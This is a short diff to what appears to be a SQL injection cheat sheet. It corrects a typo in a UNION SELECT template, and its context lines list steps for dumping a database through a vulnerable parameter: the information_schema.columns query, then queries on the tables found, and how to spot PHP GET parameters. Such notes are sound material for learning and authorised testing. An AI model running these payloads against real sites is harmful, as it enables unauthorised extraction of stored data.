@@ -60,7 +60,7 @@ For POST requests:
 3) dump the database with our Golden Statement
 -- [<vulnerable option> UNION SELECT table_schema,table_name,column_name[4,5,...] FROM information_schema.columns; --]
 4) interrogate any discovered user created databases and tables
--- [<vulnerable option> UNION SELECT <column1,column22,column3...> from <database>.<table>; --]
+-- [<vulnerable option> UNION SELECT <column1,column2,column3...> from <database>.<table>; --]
 
 For GET requests:
 1) Determine what a query looks like and looking for the ".php?<variable>=<value>"
